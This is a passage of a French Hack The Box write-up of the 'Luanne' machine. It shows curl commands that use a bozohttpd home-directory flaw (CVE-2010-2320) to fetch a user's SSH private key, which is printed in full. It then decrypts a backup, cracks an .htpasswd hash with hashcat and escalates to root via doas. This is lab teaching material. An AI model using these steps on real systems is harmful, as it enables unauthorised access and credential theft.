+<span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">199</span>  <span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">199</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">99500</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">99500</span>
+&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+/: &lt;pre&gt;No authorization&lt;/pre&gt;
+&lt;hr&gt;&lt;address&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//127.0.0.1:3001/&#34;</span>&gt;127.0.0.1:3001&lt;/a&gt;&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div><p>Si j&rsquo;essaye de faire la même chose en utilisant les creds de l&rsquo;utilisateur de l&rsquo;api web, j&rsquo;ai une réponse.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -u webapi_user:iamthebest 127.0.0.1:3001
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+<span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">386</span>  <span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">386</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   188k      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  188k
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Index&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt;
+    &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/weather/forecast?city=list&#34;</span>&gt;/weather/forecast?city<span style="color:#f92672">=</span>list&lt;/a&gt;
+    &lt;p&gt;&lt;h4&gt;Five day forecast <span style="color:#f92672">(</span>London<span style="color:#f92672">)</span>&lt;/h4&gt;&lt;/p&gt;
+    &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/weather/forecast?city=London&#34;</span>&gt;/weather/forecast?city<span style="color:#f92672">=</span>London&lt;/a&gt;
+    &lt;hr&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+$
+</code></pre></div><p>Je peux utiliser le param <code>-I</code> pour obtenir plus d&rsquo;infos, on peut voir qu&rsquo;il s&rsquo;agit d&rsquo;un serveur <a href="https://linuxreviews.org/The_bozotic_HTTP_server">bozohttpd</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -u webapi_user:iamthebest -I http://127.0.0.1:3001
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">386</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--     <span style="color:#ae81ff">0</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">21</span> Mar <span style="color:#ae81ff">2021</span> 17:31:55 GMT
+Server: bozohttpd/20190228
+Accept-Ranges: bytes
+Last-Modified: Thu, <span style="color:#ae81ff">17</span> Sep <span style="color:#ae81ff">2020</span> 20:56:21 GMT
+Content-Type: text/html
+Content-Length: <span style="color:#ae81ff">386</span>
+Connection: close
+</code></pre></div><p>On peut essayer de récupérer la clé privée RSA de <code>r.michaels</code> en utilisant le même principe, mais ça ne fonctionne pas.</p>
+<pre><code>$ curl -u webapi_user:iamthebest http//127.0.0.1:3001/home/r.michaels/.ssh/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:--  0:00:59 --:--:--     0curl: (6) Could not resolve host: **http**
+</code></pre><p>Dans la documentation de bozohttpd, on peut voir qu&rsquo;il y a du <code>apache</code>. En faisant une recherche sur les vulnérabilités de ce service, je tombe rapidement sur la <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2320">CVE-2010-2320</a> qui permet aux attaquants de lister le contenu des répertoires personnels des utilisateurs en commençant par la séquence <code>~</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl -u webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+<span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">601</span>    <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">601</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   146k      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  195k
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>/&gt;
+&lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+table <span style="color:#f92672">{</span>
+        border-top: 1px solid black;
+        border-bottom: 1px solid black;
+<span style="color:#f92672">}</span>
+th <span style="color:#f92672">{</span> background: aquamarine; <span style="color:#f92672">}</span>
+tr:nth-child<span style="color:#f92672">(</span>even<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> background: lavender; <span style="color:#f92672">}</span>
+&lt;/style&gt;
+&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
+&lt;table cols<span style="color:#f92672">=</span>3&gt;
+&lt;thead&gt;
+&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align<span style="color:#f92672">=</span>right&gt;Size
+&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../&#34;</span>&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align<span style="color:#f92672">=</span>right&gt;1kB
+&lt;tr&gt;&lt;td&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id_rsa&#34;</span>&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align<span style="color:#f92672">=</span>right&gt;3kB
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div><p>J&rsquo;obtiens un listing du répertoire de <code>r.michaels</code> et on retrouve notamment la clé privée RSA, je peux la récupérer pour me connecter en SSH.</p>
+<pre><code>$ curl -u webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:--  849k
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><h3 id="connexion-en-ssh---rmichaels">Connexion en SSH - r.michaels</h3>
+<p>Ca fonctionne et je suis maintenant connecté en SSH.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luks@Luks-PC:~/infosec/htb/actives/luanne$ chmod <span style="color:#ae81ff">600</span> id_rsa
+luks@Luks-PC:~/infosec/htb/actives/luanne$ ssh -i id_rsa r.michaels@10.10.10.218
+The authenticity of host <span style="color:#e6db74">&#39;10.10.10.218 (10.10.10.218)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.10.218<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span> to the list of known hosts.
+Last login: Fri Sep <span style="color:#ae81ff">18</span> 07:06:51 <span style="color:#ae81ff">2020</span>
+NetBSD 9.0 <span style="color:#f92672">(</span>GENERIC<span style="color:#f92672">)</span> <span style="color:#75715e">#0: Fri Feb 14 00:06:28 UTC 2020</span>
+
+Welcome to NetBSD!
+
+luanne$ id <span style="color:#f92672">&amp;&amp;</span> date <span style="color:#f92672">&amp;&amp;</span> whoami
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>r.michaels<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>
+Sun Mar <span style="color:#ae81ff">21</span> 18:13:01 UTC <span style="color:#ae81ff">2021</span>
+r.michaels
+luanne$
+</code></pre></div><p>On peut récupérer le flag user.txt. 😊</p>
+<p><img src="/img/luanne/luanne-user.txt.png" alt=""></p>
+<h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
+<p>On retrouve deux dossiers intéressants :</p>
+<ul>
+<li>backups</li>
+<li>devel</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ ls -la
+total <span style="color:#ae81ff">52</span>
+dr-xr-x---  <span style="color:#ae81ff">7</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root        wheel   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> ..
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  users  <span style="color:#ae81ff">1772</span> Feb <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .cshrc
+drwx------  <span style="color:#ae81ff">2</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .gnupg
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  users   <span style="color:#ae81ff">431</span> Feb <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .login
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  users   <span style="color:#ae81ff">265</span> Feb <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .logout
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  users  <span style="color:#ae81ff">1498</span> Feb <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .profile
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  users   <span style="color:#ae81ff">166</span> Feb <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .shrc
+dr-x------  <span style="color:#ae81ff">2</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .ssh
+dr-xr-xr-x  <span style="color:#ae81ff">2</span> r.michaels  users   <span style="color:#ae81ff">512</span> Nov <span style="color:#ae81ff">24</span> 09:26 backups
+dr-xr-x---  <span style="color:#ae81ff">4</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> devel
+dr-x------  <span style="color:#ae81ff">2</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> public_html
+-r--------  <span style="color:#ae81ff">1</span> r.michaels  users    <span style="color:#ae81ff">33</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> user.txt
+luanne$ ls -la backups/
+total <span style="color:#ae81ff">12</span>
+dr-xr-xr-x  <span style="color:#ae81ff">2</span> r.michaels  users   <span style="color:#ae81ff">512</span> Nov <span style="color:#ae81ff">24</span> 09:26 .
+dr-xr-x---  <span style="color:#ae81ff">7</span> r.michaels  users   <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
+-r--------  <span style="color:#ae81ff">1</span> r.michaels  users  <span style="color:#ae81ff">1970</span> Nov <span style="color:#ae81ff">24</span> 09:25 devel_backup-2020-09-16.tar.gz.enc
+luanne$ ls -la devel/
+total <span style="color:#ae81ff">16</span>
+dr-xr-x---  <span style="color:#ae81ff">4</span> r.michaels  users  <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .
+dr-xr-x---  <span style="color:#ae81ff">7</span> r.michaels  users  <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
+dr-xr-xr-x  <span style="color:#ae81ff">2</span> r.michaels  users  <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> webapi
+dr-xr-xr-x  <span style="color:#ae81ff">2</span> r.michaels  users  <span style="color:#ae81ff">512</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> www
+</code></pre></div><p>Le dossier <code>backups</code> contient le fichier encodé <code>devel_backup-2020-09-16.tar.gz.enc</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ tar -xf devel_backup-2020-09-16.tar.gz.enc
+tar: Error opening archive: Unrecognized archive format
+</code></pre></div><p>En recherchant <code>NetBSD decrypt tar</code>, je suis tombé sur le man de la commande <a href="https://man.netbsd.org/netpgp.1">netpgp</a> qui permet de décrypter le contenu des fichiers sur l&rsquo;OS NetBSD. Si j&rsquo;essaye j&rsquo;obtiens une permission refusée.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output<span style="color:#f92672">=</span>devel_backup-2020-09-16.tar.gz
+devel_backup-2020-09-16.tar.gz: Permission denied
+devel_backup-2020-09-16.tar.gz: Permission denied
+</code></pre></div><p>En revanche si je choisis le répertoire <code>tmp/</code> comme output, ça fonctionne et je peux extraire le contenu.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output<span style="color:#f92672">=</span>/tmp/devel_backup-2020-09-16.tar.gz
+signature  2048/RSA <span style="color:#f92672">(</span>Encrypt or Sign<span style="color:#f92672">)</span> 3684eb1e5ded454a 2020-09-14
+Key fingerprint: 027a <span style="color:#ae81ff">3243</span> <span style="color:#ae81ff">0691</span> 2e46 0c29 9f46 <span style="color:#ae81ff">3684</span> eb1e 5ded 454a
+uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;
+luanne$ cd /tmp/
+luanne$ ls
+devel_backup-2020-09-16.tar.gz
+luanne$ tar -xf devel_backup-2020-09-16.tar.gz
+luanne$ ls
+devel-2020-09-16                  devel_backup-2020-09-16.tar.gz
+</code></pre></div><p>Je décompresse l&rsquo;archive et je retrouve un autre fichier <code>.htpasswd</code> sous <code>www/</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ cd www/
+luanne$ ls -la
+total <span style="color:#ae81ff">32</span>
+drwxr-xr-x  <span style="color:#ae81ff">2</span> r.michaels  wheel   <span style="color:#ae81ff">96</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-x---  <span style="color:#ae81ff">4</span> r.michaels  wheel   <span style="color:#ae81ff">96</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  wheel   <span style="color:#ae81ff">47</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .htpasswd
+-rw-r--r--  <span style="color:#ae81ff">1</span> r.michaels  wheel  <span style="color:#ae81ff">378</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> index.html
+luanne$ cat .htpasswd
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+</code></pre></div><p>Utilisation de john pour cracker le hash</p>
+<pre><code>$hashcat -m 500 hash /usr/share/wordlists/rockyou.txt --show
+$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
+</code></pre><p>On retrouve le mot de passe <code>littlebear</code>.</p>
+<h3 id="commande-doas-et-root">Commande doas et root</h3>
+<p>Je ne peux pas utiliser la commande <code>sudo</code>, mais en faisant des recherches, je suis tombé sur la commande <a href="https://man.openbsd.org/doas">doas</a> qui a été développé par <code>Ted Unangst</code> pour OpenBSD comme un remplacement de sudo plus simple et plus sûr. On peut se connecter en root et récupérer le dernier flag root.txt. 🥳</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luanne$ sudo
+ksh: sudo: not found
+luanne$ sudo su
+ksh: sudo: not found
+luanne$ sudo -i
+ksh: sudo: not found
+luanne$ doas /bin/sh
+Password:
+sh: Cannot determine current working directory
+<span style="color:#75715e"># whoami &amp;&amp; date &amp;&amp; id</span>
+root
+Sun Mar <span style="color:#ae81ff">21</span> 19:34:09 UTC <span style="color:#ae81ff">2021</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>kmem<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>tty<span style="color:#f92672">)</span>,5<span style="color:#f92672">(</span>operator<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>staff<span style="color:#f92672">)</span>,31<span style="color:#f92672">(</span>guest<span style="color:#f92672">)</span>,34<span style="color:#f92672">(</span>nvmm<span style="color:#f92672">)</span>
+</code></pre></div><p><img src="/img/luanne/luanne-root.txt.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/luanne/">luanne</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/web/">web</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/injection/">injection</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/file-misconfiguration/">file misconfiguration</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
